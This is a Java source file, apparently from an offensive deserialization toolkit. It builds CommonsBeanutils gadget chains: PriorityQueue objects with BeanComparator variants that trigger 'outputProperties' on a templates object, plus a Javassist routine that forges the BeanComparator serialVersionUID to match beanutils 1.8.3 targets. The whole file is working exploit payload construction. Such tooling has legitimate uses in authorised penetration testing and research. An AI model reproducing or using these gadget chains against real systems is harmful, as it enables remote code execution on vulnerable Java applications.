package com.ppp.chain.commonsbeanutils;

import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.comparators.ReverseComparator;
import org.apache.commons.lang3.compare.ObjectToStringComparator;
import org.apache.logging.log4j.util.PropertySource;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * @author Whoopsunix
 */
public class BeanComparatorBuilder {
    enum CompareEnum {
        BeanComparator, CaseInsensitiveComparator, AttrCompare, ObjectToStringComparator, PropertySource, ReverseComparatorCC, ReverseComparatorJDK
    }

    private static Object DEFAULT_QUEUE_PARAM = RanDomUtils.generateRandomString(1);
    private static String V_1_83 = "1.8.3";

    public static Object scheduler(CompareEnum compareEnum, Object templates, String version) throws Exception {
        switch (compareEnum) {
            case BeanComparator:
                BeanComparator comparator = new BeanComparator("lowestSetBit");
                return queueGadgetMaker(comparatorScheduler(comparator, version), templates, new BigInteger("1"));
            case CaseInsensitiveComparator:
                BeanComparator comparator1 = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
                return queueGadgetMaker(comparatorScheduler(comparator1, version), templates, DEFAULT_QUEUE_PARAM);
            case AttrCompare:
                AttrNSImpl attrNS = new AttrNSImpl(new CoreDocumentImpl(), "1", "1", "1");
                BeanComparator comparator2 = new BeanComparator(null, new AttrCompare());
                return queueGadgetMaker(comparatorScheduler(comparator2, version), templates, attrNS);
            case ObjectToStringComparator:
                BeanComparator comparator3 = new BeanComparator(null, new ObjectToStringComparator());
                return queueGadgetMaker(comparatorScheduler(comparator3, version), templates, DEFAULT_QUEUE_PARAM);
            case PropertySource:
                PropertySource propertySource = new PropertySource() {
                    @Override
                    public int getPriority() {
                        return 0;
                    }

                };
                BeanComparator comparator4 = new BeanComparator(null, new PropertySource.Comparator());
                return queueGadgetMaker(comparatorScheduler(comparator4, version), templates, propertySource);
            case ReverseComparatorCC:
                BeanComparator comparator5 = new BeanComparator(null, new ReverseComparator());
                return queueGadgetMaker(comparatorScheduler(comparator5, version), templates, DEFAULT_QUEUE_PARAM);
            case ReverseComparatorJDK:
                BeanComparator comparator6 = new BeanComparator(null, (Comparator<?>) Reflections.newInstance("java.util.Collections$ReverseComparator"));
                return queueGadgetMaker(comparatorScheduler(comparator6, version), templates, DEFAULT_QUEUE_PARAM);
        }
        return null;
    }

    public static Object queueGadgetMaker(Comparator comparator, Object templates, Object queueParam) throws Exception {
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add(queueParam);
        queue.add(queueParam);

        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }

    public static Comparator comparatorScheduler(Comparator comparator, String version) throws Exception {
        if (version.equals(V_1_83)) {
            BeanComparatorBuilder beanComparatorBuilder = new BeanComparatorBuilder();
            Comparator result = beanComparatorBuilder.createBeanComparator();
            Reflections.setFieldValue(result, "comparator", comparator);
            return result;
        } else {
            return comparator;
        }
    }

    /**
     * 修改BeanComparator类的serialVersionUID
     */
    public Comparator createBeanComparator() {
        try {
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
            final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
            try {
                CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
                ctBeanComparator.removeField(ctSUID);
            } catch (javassist.NotFoundException e) {
            }
            ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
            final Comparator beanComparator = (Comparator) ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
            ctBeanComparator.defrost();
            return beanComparator;
        } catch (Exception e) {

        }
        return null;
    }

    public class JavassistClassLoader extends ClassLoader {
        public JavassistClassLoader() {
            super();
        }
    }

}
